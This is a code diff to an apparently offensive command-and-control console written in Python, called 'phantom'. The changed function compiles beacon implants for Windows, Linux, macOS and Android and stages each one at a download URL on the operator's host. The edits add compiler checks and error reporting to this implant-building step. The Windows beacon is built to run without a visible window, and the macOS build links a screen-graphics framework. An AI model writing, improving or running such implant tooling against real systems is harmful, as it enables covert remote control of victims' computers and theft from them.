@@ -150,7 +150,7 @@ class C2Shell(cmd.Cmd):
 
     def do_generate(self, arg):
         """generate <windows|linux|macos|android> - Generate beacon and dropper for a target platform"""
-        import os, subprocess
+        import os, subprocess, shutil
         from phantom.utils.network import get_lhost
         
         platform = arg.strip().lower() if arg.strip() else "windows"
@@ -159,7 +159,9 @@ class C2Shell(cmd.Cmd):
             notifier.error(f"Invalid platform. Choose from: {', '.join(valid_platforms)}")
             return
         
-        beacon_dir = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon")
+        import phantom
+        pkg_root = os.path.dirname(phantom.__file__)
+        beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
         host = get_lhost()
         port = server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443
         
@@ -169,18 +171,27 @@ class C2Shell(cmd.Cmd):
                 console.print("[yellow][*] Compiling beacon for Windows...[/yellow]")
                 try:
                     if os.name == 'nt':
+                        if not shutil.which("cl"):
+                            notifier.error("'cl.exe' (MSVC) not found in PATH. Run from Developer Command Prompt or install Build Tools.")
+                            return
                         subprocess.run(
                             ["cl", "/EHsc", "/O2", "/std:c++17", "src/main.cpp", "/Fe:beacon.exe",
                              "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "/SUBSYSTEM:WINDOWS"],
-                            cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            cwd=beacon_dir, check=True, capture_output=True, text=True)
                     else:
+                        if not shutil.which("x86_64-w64-mingw32-g++"):
+                            notifier.error("'x86_64-w64-mingw32-g++' not found. Install it for cross-compilation.")
+                            return
                         subprocess.run(
                             ["x86_64-w64-mingw32-g++", "-std=c++17", "-O2", "-s", "-o", "beacon.exe",
                              "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
-                            cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            cwd=beacon_dir, check=True, capture_output=True, text=True)
                     notifier.success("Windows beacon compiled.")
+                except subprocess.CalledProcessError as e:
+                    notifier.error(f"Compilation failed:\n{e.stderr}")
+                    return
                 except Exception as e:
-                    notifier.error(f"Compilation failed: {e}")
+                    notifier.error(f"Unexpected error: {e}")
                     return
             
             url = f"http://{host}:{port}/api/v1/payload"
@@ -192,14 +203,20 @@ class C2Shell(cmd.Cmd):
             if not os.path.exists(beacon_out):
                 console.print("[yellow][*] Compiling beacon for Linux...[/yellow]")
                 try:
+                    if not shutil.which("g++"):
+                        notifier.error("'g++' not found. Install build-essential, libcurl4-openssl-dev, and libssl-dev.")
+                        return
                     subprocess.run(
                         ["g++", "-std=c++17", "-O2", "-s", "-o", "beacon_linux", "src/main.cpp",
                          "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
-                        cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        cwd=beacon_dir, check=True, capture_output=True, text=True)
                     notifier.success("Linux beacon compiled.")
-                except Exception as e:
-                    notifier.error(f"Compilation failed: {e}")
+                except subprocess.CalledProcessError as e:
+                    notifier.error(f"Compilation failed:\n{e.stderr}")
                     console.print("[dim]Ensure g++, libcurl-dev, and libssl-dev are installed.[/dim]")
+                    return
+                except Exception as e:
+                    notifier.error(f"Unexpected error: {e}")
                     return
             
             url = f"http://{host}:{port}/api/v1/payload_linux"
@@ -211,14 +228,20 @@ class C2Shell(cmd.Cmd):
             if not os.path.exists(beacon_out):
                 console.print("[yellow][*] Compiling beacon for macOS...[/yellow]")
                 try:
+                    if not shutil.which("clang++"):
+                        notifier.error("'clang++' not found. Install Xcode Command Line Tools.")
+                        return
                     subprocess.run(
                         ["clang++", "-std=c++17", "-O2", "-o", "beacon_macos", "src/main.cpp",
                          "-lcurl", "-lssl", "-lcrypto", "-lpthread", "-framework", "CoreGraphics"],
-                        cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        cwd=beacon_dir, check=True, capture_output=True, text=True)
                     notifier.success("macOS beacon compiled.")
-                except Exception as e:
-                    notifier.error(f"Compilation failed: {e}")
+                except subprocess.CalledProcessError as e:
+                    notifier.error(f"Compilation failed:\n{e.stderr}")
                     console.print("[dim]Ensure Xcode Command Line Tools, curl, and openssl are installed.[/dim]")
+                    return
+                except Exception as e:
+                    notifier.error(f"Unexpected error: {e}")
                     return
             
             url = f"http://{host}:{port}/api/v1/payload_macos"
@@ -230,15 +253,21 @@ class C2Shell(cmd.Cmd):
             if not os.path.exists(beacon_out):
                 console.print("[yellow][*] Compiling beacon for Android (ARM64)...[/yellow]")
                 ndk_cc = os.environ.get("ANDROID_NDK_CC", "aarch64-linux-android28-clang++")
+                if not shutil.which(ndk_cc):
+                    notifier.error(f"Android NDK compiler '{ndk_cc}' not found. Set ANDROID_NDK_CC.")
+                    return
                 try:
                     subprocess.run(
                         [ndk_cc, "-std=c++17", "-O2", "-s", "-o", "beacon_android", "src/main.cpp",
                          "-lcurl", "-lssl", "-lcrypto", "-static"],
-                        cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        cwd=beacon_dir, check=True, capture_output=True, text=True)
                     notifier.success("Android beacon compiled.")
+                except subprocess.CalledProcessError as e:
+                    notifier.error(f"Compilation failed:\n{e.stderr}")
+                    console.print("[dim]Ensure Android NDK is installed and ANDROID_NDK_CC is set correctly.[/dim]")
+                    return
                 except Exception as e:
-                    notifier.error(f"Compilation failed: {e}")
-                    console.print("[dim]Ensure Android NDK is installed and ANDROID_NDK_CC is set.[/dim]")
+                    notifier.error(f"Unexpected error: {e}")
                     return
             
             url = f"http://{host}:{port}/api/v1/payload_android"
